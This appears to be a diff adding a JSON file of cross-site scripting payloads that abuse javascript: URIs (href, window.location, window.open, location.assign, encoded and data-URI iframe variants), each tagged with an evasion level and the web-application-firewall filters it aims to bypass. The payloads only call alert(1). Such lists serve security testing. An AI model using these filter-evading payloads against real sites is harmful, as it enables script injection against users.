@@ -1,0 +1,136 @@
+{
+  "category": "javascript_uri_injection",
+  "description": "JavaScript protocol handler abuse and URI injection",
+  "difficulty": "advanced",
+  "payloads": [
+    {
+      "name": "href_javascript_basic",
+      "payload": "<a href=\"javascript:alert(1)\">Click</a>",
+      "description": "Basic javascript: URI in href attribute",
+      "context": [
+        "href",
+        "javascript_protocol",
+        "anchor_tag"
+      ],
+      "encoding": "none",
+      "evasion_level": 5,
+      "waf_bypass": [
+        "javascript_protocol_filters"
+      ]
+    },
+    {
+      "name": "window_location_injection",
+      "payload": "window.location='javascript:alert(1)'",
+      "description": "window.location javascript protocol injection",
+      "context": [
+        "window_location",
+        "javascript_protocol",
+        "navigation"
+      ],
+      "encoding": "none",
+      "evasion_level": 7,
+      "waf_bypass": [
+        "location_filters",
+        "protocol_detection"
+      ]
+    },
+    {
+      "name": "window_open_injection",
+      "payload": "window.open('javascript:alert(1)')",
+      "description": "window.open with javascript protocol",
+      "context": [
+        "window_open",
+        "javascript_protocol",
+        "popup"
+      ],
+      "encoding": "none",
+      "evasion_level": 7,
+      "waf_bypass": [
+        "open_filters",
+        "popup_detection"
+      ]
+    },
+    {
+      "name": "javascript_void_bypass",
+      "payload": "javascript:void(alert(1))",
+      "description": "javascript:void() expression bypass",
+      "context": [
+        "javascript_void",
+        "void_operator",
+        "expression"
+      ],
+      "encoding": "none",
+      "evasion_level": 6,
+      "waf_bypass": [
+        "void_detection",
+        "expression_filters"
+      ]
+    },
+    {
+      "name": "javascript_encoded_uri",
+      "payload": "javascript:alert(String.fromCharCode(49))",
+      "description": "Encoded javascript URI with String.fromCharCode",
+      "context": [
+        "javascript_protocol",
+        "fromCharCode",
+        "encoding"
+      ],
+      "encoding": "character_encoding",
+      "evasion_level": 8,
+      "waf_bypass": [
+        "encoding_detection",
+        "fromCharCode_filters"
+      ]
+    },
+    {
+      "name": "location_assign_injection",
+      "payload": "location.assign('javascript:alert(1)')",
+      "description": "location.assign javascript protocol injection",
+      "context": [
+        "location_assign",
+        "javascript_protocol",
+        "navigation"
+      ],
+      "encoding": "none",
+      "evasion_level": 7,
+      "waf_bypass": [
+        "assign_filters",
+        "navigation_detection"
+      ]
+    },
+    {
+      "name": "javascript_expression_chain",
+      "payload": "javascript:(function(){alert(1)})();",
+      "description": "JavaScript URI with IIFE expression",
+      "context": [
+        "javascript_protocol",
+        "iife",
+        "function_expression"
+      ],
+      "encoding": "none",
+      "evasion_level": 8,
+      "waf_bypass": [
+        "iife_detection",
+        "function_filters"
+      ]
+    },
+    {
+      "name": "data_javascript_hybrid",
+      "payload": "<iframe src=\"data:text/html,<script>parent.postMessage('javascript:alert(1)','*')</script>\">",
+      "description": "Data URI + postMessage javascript injection",
+      "context": [
+        "data_uri",
+        "postMessage",
+        "iframe",
+        "javascript_protocol"
+      ],
+      "encoding": "none",
+      "evasion_level": 9,
+      "waf_bypass": [
+        "data_uri_filters",
+        "postMessage_detection",
+        "iframe_filters"
+      ]
+    }
+  ]
+}
